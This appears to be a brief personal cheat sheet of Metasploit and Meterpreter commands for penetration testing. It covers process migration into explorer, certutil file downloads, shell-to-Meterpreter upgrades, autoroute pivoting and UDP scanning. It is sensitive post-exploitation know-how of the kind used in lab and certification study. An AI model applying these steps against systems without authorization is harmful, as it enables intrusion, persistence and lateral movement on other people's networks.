# Metasploit start
```
Start the postgresql service before using metasploit
service postgresql start
```

# X86 Meterpreter session
```
If in sysinfo meterpreter command output, show a x86 meterpreter, migrate to x64 proccess if the system is x64
> pgrep explorer 
> migrate PID
```

# HTTP server
```
python -m SimpleHTTPServer 80
```

# CMD file download
```
certutil -urlcache -f URL/FILE DESTINATION_FILE
```

# Upgrade shell to meterpreter
```
sessions -u SESSION_NUMBER
```

# Pivoting MSF
```
In meterpreter

run autoroute -s IP (IP of the network to pivot)
```

# UDP scan MSF
```
auxiliary/scanner/discovery/udp_sweep
```

# Info about MSF modules
```
info -> gives info about the active module, useful for looking to the affected versions of a service by the active exploit
```